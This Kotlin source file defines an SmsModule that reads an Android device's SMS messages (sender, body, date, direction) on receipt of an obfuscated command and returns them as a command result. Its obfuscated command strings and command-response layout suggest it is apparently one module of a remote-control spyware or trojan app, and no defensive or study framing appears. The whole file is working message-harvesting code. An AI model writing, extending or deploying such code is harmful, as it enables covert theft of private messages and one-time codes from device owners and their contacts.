package com.nexlink.bridge.modules

import android.content.Context
import android.provider.Telephony
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.nexlink.bridge.ObfStr

internal object SmsModule {
    fun execute(ctx: Context, command: String): Pair<String, String> {
        val limit = command.substringAfter(ObfStr.cmdSmsPrefix(), "").toIntOrNull() ?: 50
        return Pair(getSms(ctx, limit), ObfStr.cmdResult())
    }
    private fun getSms(ctx: Context, limit: Int): String {
        return try {
            val cur = ctx.contentResolver.query(Telephony.Sms.CONTENT_URI,
                arrayOf("address", "body", "date", "type"), null, null, "date DESC")
                ?: return "Cannot read SMS"
            val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
            val sb  = StringBuilder("Messages (last $limit)\n")
            var n   = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val addr = it.getString(0) ?: "?"
                    val body = it.getString(1)?.replace("\n", " ") ?: ""
                    val date = fmt.format(Date(it.getLong(2)))
                    val type = if (it.getInt(3) == 1) "IN" else "OUT"
                    sb.appendLine("[$date][$type] $addr: $body")
                    n++
                }
            }
            if (n == 0) sb.append("Empty") else sb.appendLine("\nTotal: $n")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
